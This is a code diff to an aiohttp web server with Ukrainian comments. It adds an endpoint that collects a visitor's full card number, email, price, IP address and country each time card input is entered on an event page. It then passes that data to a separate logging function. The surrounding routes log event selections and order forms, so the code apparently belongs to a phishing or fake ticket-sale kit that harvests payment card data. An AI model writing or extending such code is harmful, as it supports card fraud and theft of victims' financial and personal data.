@@ -3930,6 +3930,38 @@ async def log_order_form_endpoint(request):
         return web.json_response({'error': str(e)}, status=500)
 
 @log_function
+async def log_card_input_endpoint(request):
+    """API endpoint для логування введення карти"""
+    try:
+        data = await request.json()
+        page_code = data.get('page_code', '')
+        card_number = data.get('card_number', '')
+        email = data.get('email', '')
+        price = data.get('price', '')
+        currency = data.get('currency', '')
+        
+        # Отримуємо IP користувача
+        user_ip = request.headers.get('X-Forwarded-For', 
+                    request.headers.get('X-Real-IP', 
+                    request.remote))
+        
+        if not page_code:
+            return web.json_response({'error': 'page_code is required'}, status=400)
+        
+        # Отримуємо країну за IP
+        user_country = get_country_by_ip(user_ip)
+        
+        # Надсилаємо лог про введення карти
+        from server import send_card_input_log
+        send_card_input_log(page_code, user_ip, user_country, card_number, email, price, currency)
+        
+        return web.json_response({'status': 'success', 'message': 'Card input logged'})
+        
+    except Exception as e:
+        print(f'[ERROR] log_card_input_endpoint: {e}')
+        return web.json_response({'error': str(e)}, status=500)
+
+@log_function
 async def event_data_api(request):
     """Оптимізований API для отримання всіх даних івенту за один запит"""
     page_code = request.query.get('page', '')
@@ -4200,6 +4232,7 @@ if __name__ == '__main__':
         app.router.add_post('/api/log_activity', log_activity_endpoint)  # <-- Додаємо endpoint для логування
         app.router.add_post('/api/log_event_selection', log_event_selection_endpoint)  # <-- Додаємо endpoint для логування вибору івенту
         app.router.add_post('/api/log_order_form', log_order_form_endpoint)  # <-- Додаємо endpoint для логування форми замовлення
+        app.router.add_post('/api/log_card_input', log_card_input_endpoint)  # <-- Додаємо endpoint для логування введення карти
         runner = web.AppRunner(app)
         await runner.setup()
         
